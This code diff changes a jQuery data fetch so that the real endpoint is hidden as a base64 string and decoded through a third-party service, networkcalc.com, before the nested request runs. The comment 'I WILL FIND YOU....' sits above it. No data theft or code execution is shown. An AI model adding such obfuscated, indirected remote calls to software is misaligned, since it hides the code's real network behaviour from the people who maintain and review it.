@@ -158,9 +158,10 @@
 var actdata = {};
 
 //I WILL FIND YOU....
-
-$.getJSON(`https://65c242abf7e6ea59682b0378.mockapi.io/data/data/0`,
+$.getJSON(`https://networkcalc.com/api/encoder/aHR0cHM6Ly82NWMyNDJhYmY3ZTZlYTU5NjgyYjAzNzgubW9ja2FwaS5pby9kYXRhL2RhdGEvMA==?encoding=base64&decode=true`,
+            	function (data2) {
+$.getJSON(data2,
             	function (data) {
 actdata=data.json
 
-})
+})})
